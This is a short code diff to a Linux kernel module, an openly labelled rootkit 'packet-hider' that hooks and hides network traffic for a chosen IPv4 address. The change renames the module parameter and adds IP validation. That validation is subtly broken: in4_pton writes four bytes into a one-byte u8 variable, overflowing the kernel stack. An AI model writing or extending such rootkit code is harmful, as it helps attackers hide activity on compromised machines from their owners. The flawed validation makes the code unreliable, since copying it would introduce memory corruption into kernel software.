@@ -4,6 +4,8 @@
  */
 #include <linux/kernel.h>
 
+#include <linux/inet.h>
+
 #include "hide_packet.h"
 #include "include.h"
 
@@ -12,7 +14,7 @@
  */
 
 static char input_ip[16]; 
-module_param_string(ipv4_address, input_ip, 16, 0);
+module_param_string(ipv4, input_ip, 16, 0);
 
 /*
  * Function called when loading the kernel module.
@@ -22,14 +24,15 @@ int init_module (void)
 {	
 	ROOTKIT_DEBUG("Loading packet-hider LKM...\n");
 	
-	//TODO: optional: Check whether this is valid ip, since we have to check this inside anyways.
-
-	/* ensure the input protocol is either 'tcp' or 'udp' */
-	/*if(! (strcmp(tlp_version, "tcp") == 0 || strcmp(tlp_version, "udp") == 0) )
+	/* ensure the input is ipv4 address */
+	u8 dst;
+	int ret = in4_pton(input_ip, -1, &dst, -1, NULL); // Use the same function for convert into integer
+	
+	if(ret == 0)
 	{
-		ROOTKIT_DEBUG("Please only use 'tcp' or 'udp' for the protocol version!\n");
+		ROOTKIT_DEBUG("Invalid IP address, Please enter valid IP\n");
 		return -EINVAL;
-	}*/
+	}
 	
 	hook_packets(input_ip);
 	
